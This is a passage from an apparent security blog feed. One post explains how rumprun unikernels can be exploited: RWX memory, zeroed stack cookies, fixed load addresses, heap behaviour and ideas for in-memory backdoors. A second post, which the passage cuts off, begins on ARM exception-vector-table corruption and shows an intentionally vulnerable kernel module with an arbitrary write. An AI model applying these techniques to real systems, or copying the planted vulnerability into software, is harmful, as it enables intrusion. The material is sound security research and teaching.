&lt;p&gt;After building &lt;code&gt;rumprun&lt;/code&gt; we should have a new compiler, &lt;code&gt;x86_64-rumprun-netbsd-gcc&lt;/code&gt;. This is a cross compiler targeting the rumpkernel platform. We can compile as normal &lt;code&gt;x86_64-rumprun-netbsd-gcc hello.c -o hello-rump&lt;/code&gt; and in fact the output is an ELF: &lt;code&gt;hello-rump: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped&lt;/code&gt;. However, as we obviously cannot directly boot an ELF we must manipulate the executable ('baking' in rumpkernel terms).&lt;/p&gt;
&lt;p&gt;Rump kernels provide a &lt;code&gt;rumprun-bake&lt;/code&gt; shell script. This script takes an ELF from compiling with the rumprun toolchain and converts it into a bootable image which we can then give to qemu or xen. Continuing in our example: &lt;code&gt;rumprun-bake hw_generic hello.bin hello-rump&lt;/code&gt;, where the &lt;code&gt;hw_generic&lt;/code&gt; just indicates we are targeting qemu.&lt;/p&gt;
&lt;h2 id="booting-and-debugging"&gt;Booting and Debugging&lt;/h2&gt;
&lt;p&gt;At this point assuming you have qemu installed, booting your new image should be as easy as &lt;code&gt;rumprun qemu -g "-curses" -i hello.bin&lt;/code&gt;. If everything went according to plan, you should see something like:&lt;/p&gt;
&lt;p&gt;&lt;img alt="hello" src="http://i.imgur.com/Or38ajp.png"&gt;&lt;/p&gt;
&lt;p&gt;Because this is just qemu at this point, if you need to debug you can easily attach via qemu’s system debugger. Additionally, a nice side effect of this toolchain is very easy debugging — you can essentially debug most of your problems on the native architecture, then just switch compilers to build a bootable image. Also, because the boot time is so much faster, debugging and fixing problems is vastly sped up.&lt;/p&gt;
&lt;p&gt;If you have further questions, or would like more detail, the &lt;a href="https://github.com/rumpkernel/wiki"&gt;Rumpkernel Wiki&lt;/a&gt; has some very good documents explaining the various components and options.&lt;/p&gt;
&lt;h1 id="peekpoke-tool"&gt;Peek/Poke Tool&lt;/h1&gt;
&lt;p&gt;Initially to develop some familiarity with the code, I wrote a simple peek/poke primitive process. The VM would boot and expose a tcp socket that would allow clients read or write arbitrary memory, as well as wrappers around &lt;code&gt;malloc()&lt;/code&gt; and &lt;code&gt;free()&lt;/code&gt; to play with the heap state. Most of the knowledge here is derived from this test code, poking at it with a debugger, and reading the rump kernel source.&lt;/p&gt;
&lt;h2 id="memory-protections"&gt;Memory Protections&lt;/h2&gt;
&lt;p&gt;One of the benefits of unikernels is you can prune components you might not need. For example, if your unikernel application does not touch the filesystem, that code can be removed from your resulting VM. One interesting consequence of this involves only running one process — because there is only one process running on the VM, there is no need for a virtual memory system to separate address spaces by process.&lt;/p&gt;
&lt;p&gt;Right now this means that all memory is read-write-execute. I'm not sure if it's possible to configure the MMU in a hypervisor to enforce memory proections without enabling virtual memory, as most of the virtual memory code I've looked at has been related to process separation with page tables, etc. In any case, currently it’s pretty trivial to introduce new code into the system and there shouldn’t be much need to resort to ROP. &lt;/p&gt;
&lt;h1 id="nginx"&gt;nginx&lt;/h1&gt;
&lt;p&gt;Nginx was the first target I looked at; I figured I could dig up the stack smash from 2013 (CVE-2013-2028) and use that as a baseline exploit to see what was possible. This ultimately failed, but exposed some interesting things along the way.&lt;/p&gt;
&lt;h2 id="reason-why-this-doesnt-work"&gt;Reason Why This Doesn’t Work&lt;/h2&gt;
&lt;p&gt;CVE-2013-2028 is a stack buffer overflow in the nginx handler for chunked requests. I thought this would be a good test as the user controls much of the data on the stack, however, various attempts to trigger the overflow failed. Running the VM in a debugger you could see the bug was not triggered despite the size value being large enough. In fact, the syscall returned an error.&lt;/p&gt;
&lt;p&gt;It turns out however that NetBSD has code to prevent against this inside the kernel:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;do_sys_recvmsg_so&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;lwp&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;msghdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;mbuf&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;mbuf&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;control&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;register_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;retsize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="c1"&gt;// …&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tiov&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iov_len&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SSIZE_MAX&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;auio&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uio_resid&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;SSIZE_MAX&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;EINVAL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="c1"&gt;// …&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;iov_len is our &lt;code&gt;recv()&lt;/code&gt; size parameter, so this bug is dead in the water. As an aside, this also made me wonder how Linux applications would respond if you passed a size greater than LONG_MAX into &lt;code&gt;recv()&lt;/code&gt; and it succeeded…&lt;/p&gt;
&lt;h2 id="something-interesting"&gt;Something Interesting&lt;/h2&gt;
&lt;p&gt;Traditionally when exploiting this bug one has to worry about stack cookies. Nginx has a worker pool of processes forked from the main process. In the event of a crash, a new process will be forked from the parent, meaning that the stack cookie will remain constant across subsequent connections. This allows you to break it down into four, 1 byte brute forces as opposed to one 4 byte, meaning it can be done in a maximum of 1024 connections. However, inside the unikernel, there is only one process — if a process crashes the entire VM must be restarted, and because the only process is the kernel, the stack cookie should (in theory) be regenerated. Looking at the disassembled nginx code, you can see the stack cookie checks in all off the relevant functions.&lt;/p&gt;
&lt;p&gt;In practice, the point is moot because the stack cookies are always zero. The compiler creates and checks the cookies, it just never populates &lt;code&gt;fs:0x28&lt;/code&gt; (the location of the cookie value), so it’s always a constant value and assuming you can write null bytes, this should pose no problem.&lt;/p&gt;
&lt;h1 id="aslr"&gt;ASLR&lt;/h1&gt;
&lt;p&gt;I was curious if unikernels would implement some form of ASLR, as during the build process they get compiled to an ELF (which is quite nice for analysis!) which might make position independent code easier to deal with. They don’t: all images are loaded at &lt;code&gt;0x100000&lt;/code&gt;. There is however "natures ASLR" as these images aren’t distributed in binary form. Thus, as everyone must compile their own images, these will vary slightly depending on compiler version, software version, etc. However, even this constraint gets made easier. If you look at the format of the loaded images, they look something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x100000: &amp;lt;unikernel init code&amp;gt;
…
0x110410: &amp;lt;application code starts&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This means across any unikernel application you’ll have approximately 0x10000 bytes of fixed value, fixed location executable memory. If you find an exploitable bug it should be possible to construct a payload entirely from the code in this section. This payload could be used to leak the application code, install persistence, whatever.&lt;/p&gt;
&lt;h1 id="php"&gt;PHP&lt;/h1&gt;
&lt;p&gt;Once nginx was off the table, I needed another application that had a rumpkernel package and a history of exploitable bugs. The PHP interpreter fits the bill. I ended up using Sean Heelan's PHP bug &lt;a href="https://bugs.php.net/bug.php?id=70068"&gt;#70068&lt;/a&gt;, because of the provided trigger in the bug description, and detailed description explaining the bug. Rather than try to poorly recap Sean's work, I'd encourage you to just read the inital report if you're curious about the bug.&lt;/p&gt;
&lt;p&gt;In retrospect, I took a poor exploitation path for this bug. Because the heap slabs have no ASLR, you can fairly confidently predict mapped addresses inside the PHP interpreter. Furthermore, by controlling the size of the payload, you can determine which bucket it will fall into and pick a lesser used bucket for more stability. This allows you to be lazy, and hard code payload addresses, leading to easy exploitation. This works very well -- I was basically able to take Sean's trigger, slap some addresses and a payload into it, and get code exec out of it. However, the downsides to this approach quickly became apparent. When trying to return from my payload and leave the interpreter in a sane state (as in, running) I realized that I would need to actually understand the PHP heap to repair it. I started this process by examining the rump heap (see below), but got bored when I ended up in the PHP heap.&lt;/p&gt;
&lt;h1 id="persistence"&gt;Persistence&lt;/h1&gt;
&lt;p&gt;This was the portion I wanted to finish for EkoParty, and it didn’t get done. In theory, as all memory is read-write-execute, it should be pretty trivial to just patch &lt;code&gt;recv()&lt;/code&gt; or something to inspect the data received, and if matching some constant execute the rest of the packet. This is strictly in memory, anything touching disk will be application specific.&lt;/p&gt;
&lt;p&gt;Assuming your payload is stable, you should be able to install an in-memory backdoor which will persist for the runtime of that session (and be deleted on poweroff). While in many configurations there is no writable persistent storage which will survive reboots this is not true for all unikernels (e.g. mysql). In those cases it might be possible to persist across power cycles, but this will be application specific.&lt;/p&gt;
&lt;p&gt;One final, and hopefully obvious note: one of the largest differences in exploitation of unikernels is the lack of multiple processes. Exploits frequently use the existence of multiple processes to avoid cleaning up application state after a payload is run. In a unikernel, your payload must repair application state or crash the VM. In this way it is much more similar to a kernel exploit.&lt;/p&gt;
&lt;h1 id="heap-notes"&gt;Heap Notes&lt;/h1&gt;
&lt;p&gt;The unikernel heap is quite nice from an exploitation perspective. It's a slab-style allocator with in-line metadata on every block. Specifically, the metadata contains the ‘bucket’ the allocation belongs to (and thus the freelist the block should be released to). This means a relative overwrite plus &lt;code&gt;free()&lt;/code&gt;ing into a smaller bucket should allow for fairly fine grained control of contents. Additionally the heap is LIFO, allowing for standard heap massaging.&lt;/p&gt;
&lt;p&gt;Also, while kinda untested, I believe rumpkernel applications are compiled without &lt;code&gt;QUEUEDEBUG&lt;/code&gt; defined. This is relevant as the sanity checks on &lt;code&gt;unlink&lt;/code&gt; operations ("safe unlink") require this to be defined. This means that in some cases, if freelists themselves can be overflown then removed you can get a write-what-where. However, I think this is fairly unlikely in practice, and with the lack of memory protections elsewhere, I'd be surprised if it would currently be useful.&lt;/p&gt;
&lt;p&gt;You can find most of the relevant heap source &lt;a href="https://github.com/rumpkernel/rumprun/blob/master/lib/libbmk_core/memalloc.c"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="symbol-resolution"&gt;Symbol Resolution&lt;/h1&gt;
&lt;p&gt;Rumpkernels helpfully include an entire syscall table under the &lt;code&gt;mysys&lt;/code&gt; symbol. When rumpkernel images get loaded, the ELF header gets stripped, but the rest of the memory is loaded contigiously:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gef➤  info file
Symbols from &amp;quot;/home/x/rumprun-packages/php5/bin/php.bin&amp;quot;.
Remote serial target in gdb-specific protocol:
Debugging a target over a serial line.
        While running this, GDB does not access memory from...
Local exec file:
        `/home/x/rumprun-packages/php5/bin/php.bin&amp;#39;, file type elf64-x86-64.
        Entry point: 0x104000
        0x0000000000100000 - 0x0000000000101020 is .bootstrap
        0x0000000000102000 - 0x00000000008df31c is .text
        0x00000000008df31c - 0x00000000008df321 is .init
        0x00000000008df340 - 0x0000000000bba9f0 is .rodata
        0x0000000000bba9f0 - 0x0000000000cfbcd0 is .eh_frame
        0x0000000000cfbcd0 - 0x0000000000cfbd28 is link_set_sysctl_funcs
        0x0000000000cfbd28 - 0x0000000000cfbd50 is link_set_bufq_strats
        0x0000000000cfbd50 - 0x0000000000cfbde0 is link_set_modules
        0x0000000000cfbde0 - 0x0000000000cfbf18 is link_set_rump_components
        0x0000000000cfbf18 - 0x0000000000cfbf60 is link_set_domains
        0x0000000000cfbf60 - 0x0000000000cfbf88 is link_set_evcnts
        0x0000000000cfbf88 - 0x0000000000cfbf90 is link_set_dkwedge_methods
        0x0000000000cfbf90 - 0x0000000000cfbfd0 is link_set_prop_linkpools
        0x0000000000cfbfd0 - 0x0000000000cfbfe0 is .initfini
        0x0000000000cfc000 - 0x0000000000d426cc is .data
        0x0000000000d426d0 - 0x0000000000d426d8 is .got
        0x0000000000d426d8 - 0x0000000000d426f0 is .got.plt
        0x0000000000d426f0 - 0x0000000000d42710 is .tbss
        0x0000000000d42700 - 0x0000000000e57320 is .bss
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This means you should be able to just run simple linear scan, looking for the &lt;code&gt;mysys&lt;/code&gt; table. A basic heuristic should be fine, 8 byte syscall number, 8 byte address. In the PHP5 interpreter, this table has 67 entries, giving it a big, fat footprint:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gef➤  x/6g mysys
0xaeea60 &amp;lt;mysys&amp;gt;:       0x0000000000000003      0x000000000080b790 -- &amp;lt;sys_read&amp;gt;
0xaeea70 &amp;lt;mysys+16&amp;gt;:    0x0000000000000004      0x000000000080b9d0 -- &amp;lt;sys_write&amp;gt;
0xaeea80 &amp;lt;mysys+32&amp;gt;:    0x0000000000000006      0x000000000080c8e0 -- &amp;lt;sys_close&amp;gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is probably a chain of pointers in the initial constant 0x10410 bytes you could also follow, but this approach should work fine.&lt;/p&gt;
&lt;h1 id="hypervisor-fuzzing"&gt;Hypervisor fuzzing&lt;/h1&gt;
&lt;p&gt;After playing with these for a while, I had another idea: rather than using unikernels to host userland services, I think there is a really cool opportunity to write a hypervisor fuzzer in a unikernel. Consider:
You have all the benefits of a POSIX userland only you’re in ring0. You don’t need to export your data to userland to get easy and familiar IO functions.
Unikernels boot really, really fast. As in under 1 second. This should allow for pretty quick state clearing.&lt;/p&gt;
&lt;p&gt;This is definitely an area of interesting future work I’d like to come back to.&lt;/p&gt;
&lt;h1 id="final-suggestions"&gt;Final Suggestions&lt;/h1&gt;
&lt;p&gt;If you develop unikernels:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Populate the randomness for stack cookies.&lt;/li&gt;
&lt;li&gt;Load at a random location for some semblance of ASLR.&lt;/li&gt;
&lt;li&gt;Is there a way you can enforce memory permissions? Some form of NX would go a long way.&lt;/li&gt;
&lt;li&gt;If you can’t, some control flow integrity stuff might be a good idea? Haven’t really thought this through or tried it.&lt;/li&gt;
&lt;li&gt;Take as many lessons from grsec as possible.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re exploiting unikernels:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Have fun.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re exploiting hypervisors:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Unikernels might provide a cool platform to easily play in ring0.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="thanks"&gt;Thanks&lt;/h2&gt;
&lt;p&gt;For feedback, bugs used, or editing
&lt;a href="https://twitter.com/seanhn"&gt;@seanhn&lt;/a&gt;, &lt;a href="https://twitter.com/hugospns"&gt;@hugospns&lt;/a&gt;, &lt;a href="https://twitter.com/0vercl0k"&gt;@0vercl0k&lt;/a&gt;, &lt;a href="https://twitter.com/darkarnium"&gt;@darkarnium&lt;/a&gt;, other quite helpful anonymous types.&lt;/p&gt;</content><category term="unikernel"></category><category term="rumpkernel"></category><category term="exploitation"></category></entry><entry><title>Corrupting the ARM Exception Vector Table</title><link href="/blog/2014/04/30/corrupting-arm-evt/" rel="alternate"></link><published>2014-04-30T21:01:00-07:00</published><updated>2014-04-30T21:01:00-07:00</updated><author><name>Amat "acez" Cama</name></author><id>tag:None,2014-04-30:/blog/2014/04/30/corrupting-arm-evt/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I'd explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper "Vector Rewrite Attack"&lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;[1]&lt;/a&gt;, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.&lt;/p&gt;
&lt;p&gt;The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.&lt;/p&gt;
&lt;p&gt;I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).&lt;/p&gt;
</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I'd explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper "Vector Rewrite Attack"&lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;[1]&lt;/a&gt;, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.&lt;/p&gt;
&lt;p&gt;The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.&lt;/p&gt;
&lt;p&gt;I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).&lt;/p&gt;


&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#arm-exceptions-and-the-exception-vector-table"&gt;ARM Exceptions and the Exception Vector Table&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#the-exceptions"&gt;The Exceptions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-exception-vector-table"&gt;The Exception Vector Table&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#a-note-about-the-undefined-instruction-exception"&gt;A note about the Undefined Instruction exception&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#corrupting-the-evt"&gt;Corrupting the EVT&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#local-scenario"&gt;Local scenario&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#the-exploit"&gt;The Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#remote-scenario"&gt;Remote scenario&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#the-exploit_1"&gt;The Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#bonus-interrupt-stack-overflow"&gt;Bonus: Interrupt Stack Overflow&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#a-few-things-about-all-this"&gt;A Few Things about all this&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#final-words"&gt;Final words&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#references"&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="arm-exceptions-and-the-exception-vector-table"&gt;ARM Exceptions and the Exception Vector Table&lt;/h1&gt;
&lt;p&gt;In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor's "permissions" in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Exception                   |       Mode            |     Description
 ----------------------------|-----------------------|-------------------------------------------------------------------
 Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
 Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
 Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
 Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
 Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system&lt;/p&gt;
&lt;h2 id="the-exceptions"&gt;The Exceptions&lt;/h2&gt;
&lt;p&gt;The exceptions change the processor mode and each exception has access to a set of &lt;em&gt;banked&lt;/em&gt; registers. These can be described as a set of registers that exist only in the exception's context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img alt="Banked Registers" src="/images/corrupting_arm_evt/banked_regs.png"&gt;&lt;/center&gt;  &lt;/p&gt;
&lt;h2 id="the-exception-vector-table"&gt;The Exception Vector Table&lt;/h2&gt;
&lt;p&gt;The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is &lt;strong&gt;0xffff0000&lt;/strong&gt;. Each entry in the EVT is also at a known offset as can be seen on the following table:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Exception                   |       Address            
 ----------------------------|-----------------------
 Reset                       |      0xffff0000           
 Undefined Instruction       |      0xffff0004       
 SWI                         |      0xffff0008  
 Prefetch Abort              |      0xffff000c       
 Data Abort                  |      0xffff0010 
 Reserved                    |      0xffff0014  
 IRQ                         |      0xffff0018   
 FIQ                         |      0xffff001c
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="a-note-about-the-undefined-instruction-exception"&gt;A note about the Undefined Instruction exception&lt;/h3&gt;
&lt;p&gt;Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn't because it is used by the kernel. &lt;em&gt;Hard float&lt;/em&gt; and &lt;em&gt;Soft float&lt;/em&gt; are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel. &lt;/p&gt;
&lt;p&gt;If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.&lt;/p&gt;
&lt;h1 id="corrupting-the-evt"&gt;Corrupting the EVT&lt;/h1&gt;
&lt;p&gt;There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.&lt;/p&gt;
&lt;h2 id="local-scenario"&gt;Local scenario&lt;/h2&gt;
&lt;p&gt;The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
        &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
